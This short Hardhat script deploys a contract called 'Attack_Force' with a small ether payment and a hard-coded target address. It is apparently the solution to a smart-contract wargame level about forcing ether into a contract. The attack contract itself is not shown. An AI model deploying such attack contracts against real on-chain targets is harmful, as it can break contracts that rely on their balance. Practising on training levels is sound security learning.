const {ethers} = require('hardhat');

const main = async () => {
    const target_address = '0xd71d2e88A374100617263262596c48C2DbB2C29c';
    const users = await ethers.getSigners();
    console.log('Deploying contracts with the account:', users[1].address);
    
    const sendValue =  ethers.utils.parseEther('0.00000001');
    const tx = {
        value: sendValue,
    };
    const Attack_Force = await ethers.getContractFactory('Attack_Force');
    const attack_force = await Attack_Force.connect(users[1]).deploy(target_address, tx);
    await attack_force.deployed();

    console.log('Attack_Force deployed to:', attack_force.address);

}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    })